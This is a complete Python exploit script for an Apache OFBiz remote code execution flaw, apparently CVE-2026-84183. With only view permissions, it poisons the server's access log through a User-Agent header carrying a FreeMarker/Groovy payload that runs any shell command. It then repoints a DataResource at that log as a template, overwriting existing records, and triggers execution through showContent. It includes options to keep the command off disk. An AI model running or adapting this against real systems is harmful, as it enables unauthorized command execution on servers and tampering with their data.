#!/usr/bin/env python3
"""Apache OFBiz Content Manager VIEW-only RCE via updateLayout (CVE-2026-84183).

The authenticated /content/control/updateLayout event authorises an attacker-built
Content value for the hard-coded CONTENT_CREATE operation, which a production seed
rule grants to any RESPONSE-purpose content, then writes the real Content and an
independently chosen DataResource with no update check on either. An account holding
only OFBTOOLS_VIEW and CONTENTMGR_VIEW repoints a DataResource at OFBiz's own access
log as an OFBIZ_FILE/FTL template, poisons that log through a User-Agent header, and
the normal showContent route evaluates the FreeMarker/Groovy payload. Fixed in
Apache OFBiz 24.09.08.
"""

import argparse
import datetime as dt
import os
import re
import secrets
import sys
import time
from email.utils import parsedate_to_datetime

import requests

BOOTSTRAP = "/content/control/main"
LOGIN = "/content/control/login"
UPDATE_LAYOUT = "/content/control/updateLayout"
SHOW_CONTENT = "/content/control/showContent"

# --- terminal UI ---
_BANNER = r"""
  ___  _____ ____ ___ _____
 / _ \|  ___| __ )_ _|__  /
| | | | |_  |  _ \| |  / /
| |_| |  _| | |_) | | / /_
 \___/|_|   |____/___/____|
"""
_COLOR = sys.stderr.isatty() and os.environ.get("NO_COLOR") is None


def _paint(code, text):
    return f"\033[{code}m{text}\033[0m" if _COLOR else text


def banner(subtitle):
    sys.stderr.write(_paint("36", _BANNER.strip("\n")) + "\n")
    sys.stderr.write("  " + _paint("2", subtitle) + "\n")
    sys.stderr.write("  " + _paint("2", "discovered by CryptoCat · cryptocat.me") + "\n\n")


def info(msg): sys.stderr.write(f" {_paint('36', '[*]')} {msg}\n")
def good(msg): sys.stderr.write(f" {_paint('32', '[+]')} {msg}\n")
def warn(msg): sys.stderr.write(f" {_paint('33', '[!]')} {msg}\n")
def bad(msg): sys.stderr.write(f" {_paint('31', '[-]')} {msg}\n")
def die(msg): bad(msg); sys.exit(1)


def output(data, label):
    good(label)
    sys.stderr.write(_paint("2", "  " + "-" * 60) + "\n")
    sys.stdout.write(data if data.endswith("\n") else data + "\n")
    sys.stdout.flush()
# --- end terminal UI ---


def csrf_token(body):
    m = re.search(r'name=["\']csrf-token["\'][^>]*content=["\']([^"\']+)', body, re.I)
    return m.group(1) if m else None


def ajax(session, token):
    h = {"X-Requested-With": "XMLHttpRequest"}
    # Older deployments may disable the CSRF strategy, so add the header only when one was issued.
    if token:
        h["X-CSRF-Token"] = token
    return h


def log_template(nonce, command, off_disk=False):
    """A double-quote-free FreeMarker payload; Tomcat's header escaping leaves it intact.

    Two ways to get the command to the scriptlet:

    - default: the command is hex-encoded into the payload and decoded inside groovy, so execution
      never depends on the request reaching the groovy binding. FreeMarker's parameters model does
      not unwrap into that binding reliably across builds (a read from it can arrive null), and a
      self-contained hex literal sidesteps that entirely while carrying any command bytes through
      Tomcat's header logging untouched. The command does land, hex-encoded, in the access log.

    - off_disk: the command is supplied at showContent time as the request parameter cmd, read
      through the binding, so it never touches the access log. This matches the original report but
      relies on that parameters binding, which does not evaluate on every build.

    Either way expandString needs a Map for its context, and the never-read parameters model serves
    as one. The nonce that frames the output is assembled from two halves inside the groovy result,
    so the literal template never contains the whole nonce. A frame can therefore only appear when
    the groovy actually ran: a groovy error makes expandString return null and a blocked static call
    makes FreeMarker substitute a placeholder, and neither yields the joined nonce. That is what
    makes a matched frame proof of execution rather than of a merely rendered template.
    """
    # Split the nonce so the complete execution marker never appears literally in the poisoned log line.
    a, b = nonce[:len(nonce) // 2], nonce[len(nonce) // 2:]
    # Default mode hex-bakes the command; --off-disk instead resolves cmd from the render request.
    argv = "cmd" if off_disk else f"new String((/{command.encode().hex()}/).decodeHex())"
    return (f"<#assign e=r'${{groovy:(/{a}/+/{b}/)"
            f"+[/sh/,/-c/,{argv}].invokeMethod(/exe/+/cute/,null).text"
            f"+(/{a}/+/{b}/)}}'>"
            f"${{Static['org.apache.ofbiz.base.util.string.FlexibleStringExpander'].expandString(e,parameters)}}")


def candidate_logs(poison_response, override):
    if override:
        return [override]
    # Use the target's HTTP Date rather than the operator's clock, including adjacent midnight dates.
    when = parsedate_to_datetime(poison_response.headers.get("Date"))
    if when.tzinfo is None:
        when = when.replace(tzinfo=dt.timezone.utc)
    day = when.astimezone(dt.timezone.utc).date()
    return [f"runtime/logs/access_log.{d.isoformat()}"
            for d in (day, day - dt.timedelta(days=1), day + dt.timedelta(days=1))]


def main():
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="example:\n"
               "  %(prog)s https://target:8443 ulv-reader 'pass' RESPONSE_CONTENT_ID DATA_RESOURCE_ID -c id\n")
    ap.add_argument("target", metavar="URL", help="OFBiz HTTPS origin, e.g. https://host:8443")
    ap.add_argument("username")
    ap.add_argument("password")
    ap.add_argument("content_id", metavar="RESPONSE_CONTENT_ID", help="existing Content with a RESPONSE purpose (overwritten)")
    ap.add_argument("data_resource_id", metavar="DATA_RESOURCE_ID", help="DataResource to repurpose (overwritten)")
    ap.add_argument("-c", "--command", default="id", metavar="CMD", help="command to run (default: id)")
    ap.add_argument("--log-path", metavar="PATH", help="access-log path relative to ofbiz.home (default: derive from Date)")
    ap.add_argument("--flush-delay", type=float, default=2.0, metavar="S", help="wait for the buffered access log to flush (default: 2)")
    ap.add_argument("--off-disk", action="store_true",
                    help="pass the command at showContent time instead of hex-baking it into the access log "
                         "(keeps it off disk; relies on a parameters binding that does not evaluate on every build)")
    ap.add_argument("--tenant-id", metavar="ID", help="OFBiz tenant id for a multitenant deployment")
    ap.add_argument("--verify-tls", action="store_true", help="verify TLS (off by default; OFBiz ships self-signed certs)")
    ap.add_argument("--no-color", action="store_true", help="disable coloured output")
    args = ap.parse_args()
    if args.no_color:
        globals()["_COLOR"] = False

    banner("Content Manager VIEW-only RCE via updateLayout  ·  CVE-2026-84183")
    base = args.target.rstrip("/")
    nonce = secrets.token_hex(8)
    session = requests.Session()
    session.verify = args.verify_tls
    if not args.verify_tls:
        requests.packages.urllib3.disable_warnings()

    login_fields = {"USERNAME": args.username, "PASSWORD": args.password}
    if args.tenant_id:
        login_fields["userTenantId"] = args.tenant_id
    boot = session.get(base + BOOTSTRAP, timeout=15)
    session.post(base + LOGIN, data=login_fields,
                 headers=ajax(session, csrf_token(boot.text)), timeout=15, allow_redirects=True)
    # The path-scoped securedLoginId is the reliable proof that Content Manager accepted the login.
    if session.cookies.get("content.securedLoginId") != args.username:
        die("authentication failed; check the credentials")
    good(f"authenticated as {args.username}")

    # Tomcat persists the attacker-controlled User-Agent before updateLayout points a DataResource at it.
    info("Writing a double-quote-free FreeMarker payload through the User-Agent access log")
    poison = session.get(base + BOOTSTRAP,
                         headers={"User-Agent": log_template(nonce, args.command, args.off_disk)}, timeout=15)
    time.sleep(args.flush_delay)

    # updateLayout returns HTTP 200 whatever happens, and a successful write on a vulnerable target
    # still renders "The Following Errors Occurred:" around a benign "permissionStatus:granted" line,
    # so that phrase cannot mean failure. Only an explicit permission denial or a missing DataResource
    # does. Success is proven by the showContent execution frame, which the payload builds inside the
    # groovy result, so gate solely on these denial markers and otherwise go straight to showContent.
    errors = ("permissionstatus:rejected", "permission not granted", "access refused",
              "entity value not found")
    token = csrf_token(session.get(base + BOOTSTRAP, timeout=15).text)
    reason = None
    for log_path in candidate_logs(poison, args.log_path):
        info(f"Repointing {args.data_resource_id} at {log_path} as OFBIZ_FILE/FTL")
        # RESPONSE satisfies the flawed create check while the existing Content and DataResource are overwritten.
        r = session.post(base + UPDATE_LAYOUT, headers=ajax(session, token), timeout=20, data={
            "contentId": args.content_id, "contentPurposeTypeId": "RESPONSE",
            "dataResourceId": args.data_resource_id, "dataResourceTypeId": "OFBIZ_FILE",
            "dataTemplateTypeId": "FTL", "mimeTypeId": "text/html",
            "drObjectInfo": log_path, "isPublic": "N"})
        low = r.text.casefold()
        hit = next((e for e in errors if e in low), None)
        if r.status_code in (401, 403) or hit:
            reason = f"HTTP {r.status_code}" if r.status_code in (401, 403) else hit
            continue
        show = {"contentId": args.content_id}
        if args.off_disk:
            show["cmd"] = args.command
        # Normal Content rendering treats the repointed access log as FTL and evaluates the stored payload.
        rendered = session.post(base + SHOW_CONTENT, headers=ajax(session, token), timeout=30, data=show)
        frame = re.search(re.escape(nonce) + r"(.*?)" + re.escape(nonce), rendered.text, re.S)
        if frame:
            good(f"updateLayout accepted and showContent evaluated the template ({log_path})")
            output(frame.group(1).strip(), "command output recovered through showContent")
            return
        warn(f"{log_path} accepted but no execution frame; trying the next date")
    if reason:
        die(f"updateLayout rejected the write ({reason}): {args.content_id!r} is not a RESPONSE carrier the "
            "account can use, or the DataResource id does not exist, or the target is patched")
    die("no command output; the access log path may be non-default (try --log-path)")


if __name__ == "__main__":
    try:
        main()
    except requests.RequestException as e:
        die(f"request failed: {e}")
    except KeyboardInterrupt:
        sys.exit(130)
